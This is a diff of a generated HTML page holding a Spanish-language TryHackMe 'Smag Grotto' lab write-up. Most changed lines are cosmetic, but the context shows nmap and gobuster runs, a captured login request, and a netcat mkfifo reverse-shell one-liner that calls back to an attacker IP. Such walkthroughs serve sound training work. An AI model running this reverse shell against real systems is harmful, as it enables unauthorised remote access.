@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
+<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
+<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1255,7 +1255,7 @@
     <meta property="twitter:description" content="Smag Grotto es una maquina de TryHackMe, analizamos un archivo PCAP donde encontramos credenciales para ingresar en la plataforma y ejecutar una shell inversa. Cambiamos al siguiente usuario tomando ventaja de un CronJob. Escalamos privilegios utilizando APT.">
   
 
-<meta name="generator" content="Hugo 0.92.0" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1645,7 +1645,7 @@
 <p>Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1658,7 +1658,7 @@
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Wed Jul 29 17:29:14 2020 as: nmap -sV -o nmap_scan_mini smag.thm</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Wed Jul 29 17:29:14 2020 as: nmap -sV -o nmap_scan_mini smag.thm</span>
 Nmap scan report <span class="k">for</span> smag.thm <span class="o">(</span>10.10.138.62<span class="o">)</span>
 Host is up <span class="o">(</span>0.26s latency<span class="o">)</span>.
 Not shown: <span class="m">998</span> closed ports
@@ -1678,12 +1678,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>Utilizamos gobuster para busqueda de directorios y archivos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/smag# gobuster dir -u http://smag.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t <span class="m">25</span> -x php,html,txt
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/smag# gobuster dir -u http://smag.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t <span class="m">25</span> -x php,html,txt
 /index.php <span class="o">(</span>Status: 200<span class="o">)</span>
 /mail <span class="o">(</span>Status: 301<span class="o">)</span>
 </code></pre></td></tr></table>
@@ -1694,7 +1694,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>Analizamos el archivo y encontramos credenciales, además de ello un subdominio.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1708,7 +1708,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">POST /login.php HTTP/1.1
+<pre class="chroma"><code class="language-bash" data-lang="bash">POST /login.php HTTP/1.1
 Host: development.smag.thm
 User-Agent: curl/7.47.0
 Accept: */*
@@ -1731,10 +1731,10 @@ Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><
 <p>Ejecutamos la siguiente shell inversa con nuestra IP y PUERTO para obtener una shell con el usuario <code>www-data</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>nc 10.0.0.0 <span class="m">1338</span> &gt;/tmp/f
+<pre class="chroma"><code class="language-bash" data-lang="bash">rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>nc 10.0.0.0 <span class="m">1338</span> &gt;/tmp/f
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/thm/smag/Screenshot_20200729_170352.webp" alt="image" /></p>
@@ -1856,7 +1856,7 @@ Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><
     </div>
     <div class="whoami__desc">
       
-        Pentester wannabe
+        CTF Player | RedTeamer &amp; Pentester wannabe
       
     </div>
     <div class="whoami__social">
@@ -2011,7 +2011,7 @@ Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><
 </div>
 
 
-<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
+<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
